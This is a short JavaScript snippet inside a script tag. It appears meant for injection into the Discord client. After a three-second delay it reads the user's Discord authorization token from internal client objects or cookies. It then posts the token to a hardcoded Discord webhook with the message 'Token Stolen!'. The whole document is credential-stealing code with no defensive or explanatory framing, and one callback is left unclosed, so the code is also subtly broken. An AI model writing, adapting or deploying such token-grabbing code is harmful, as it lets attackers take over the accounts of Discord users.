<script>
  setTimeout(() => {
    let token = null;
    
    // Try to grab the token from Discord's internal memory
    try {
      // Modern Discord versions
      token = window._discordHeaders?.Authorization || 
              window.z?.[0]?.c?.exports?.default?.instance?.getToken();
    } catch (e) {}

    // Fallback: Check cookies (less common now but still possible)
    if (!token) {
      const match = document.cookie.match(/token=([^;]+)/);
      if (match) token = match[1];
    }

    if (token) {
      // Send to your Discord Webhook
      fetch('https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🎣 **Token Stolen!**\n\`\`\`${token}\`\`\``
        })
      }).then(() => {
        console.log("Token sent.");

    }
  }, 3000); // Wait 3 seconds for Discord to load fully
</script>
